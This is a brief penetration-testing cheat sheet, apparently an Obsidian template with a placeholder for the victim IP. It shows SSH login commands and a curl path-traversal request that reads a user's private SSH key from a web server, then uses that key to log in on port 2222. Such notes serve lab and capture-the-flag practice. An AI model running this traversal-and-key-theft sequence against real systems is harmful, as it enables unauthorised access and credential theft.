- you can’t get initial access directly however we can login with user and password and private key.

```sh
ssh Usuario@ip
```

- ssh use with different port 

```sh
ssh -p 2222 noman@<% tp.frontmatter["IPVictima"] %> 
```

- Obtener id_rsa remoto para luego hacer login 

```sh
 curl http://<% tp.frontmatter["IPVictima"] %>/index.php?page=../../../../../../../../../home/noman/.ssh/id_rsa
```

```sh
 chmod 600 id_rsa  and then ssh -i id_rsa -p 2222 noman@<% tp.frontmatter["IPVictima"] %>
```

```sh
 user/.ssh/authorized key
```
